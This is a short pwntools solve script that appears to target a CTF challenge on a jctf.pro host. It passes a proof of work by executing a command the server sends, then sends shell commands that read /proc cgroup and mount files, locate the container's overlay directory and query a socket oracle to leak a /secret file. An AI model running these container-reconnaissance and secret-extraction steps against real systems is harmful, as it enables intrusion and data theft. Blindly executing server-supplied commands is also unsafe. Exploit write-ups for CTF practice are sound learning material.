#!/usr/bin/python3

from pwn import *
import subprocess

r = remote('docker-ams3.nc.jctf.pro', 1337)

r.recvuntil('Please use the following command to solve the Proof of Work:\r\n')
commands = r.recvline()[:-2].decode().split(' ')

p = subprocess.Popen(commands, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
out, err = p.communicate()
out = out[:-1]
r.sendlineafter('Your PoW: ', out)
r.sendlineafter('I have no name!', 'cat /proc/self/cgroup')
r.recvuntil('1:name=systemd:/docker/')
l1 = 'Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz'
l2 = r.recvline()[:-2]
l3 = 'for((i=1;i<=4;i+=2)); do echo ""; cat /secret; echo ""; sleep 5; done &'
l4 = 'cat /proc/1/task/1/mounts'

r.sendline(l4)
r.recvuntil(',upperdir=')
mnt = r.recvuntil(',workdir=', drop=True)
print(mnt + b'/secret')
r.sendline('socat - UNIX-CONNECT:/oracle.sock')
sleep(0.3)
r.sendline(l1)
sleep(0.3)
r.sendline(l2)
sleep(0.3)
r.sendline("fuck")
sleep(0.1)
r.sendline("fuck")
r.recvuntil('I have no name!')
## generate secret
"""
r.sendline(l3)
sleep(0.3)
r.sendline('socat - UNIX-CONNECT:/oracle.sock')
sleep(0.3)
r.sendline(l1)
sleep(0.3)
r.sendline(l2)
"""

r.interactive()
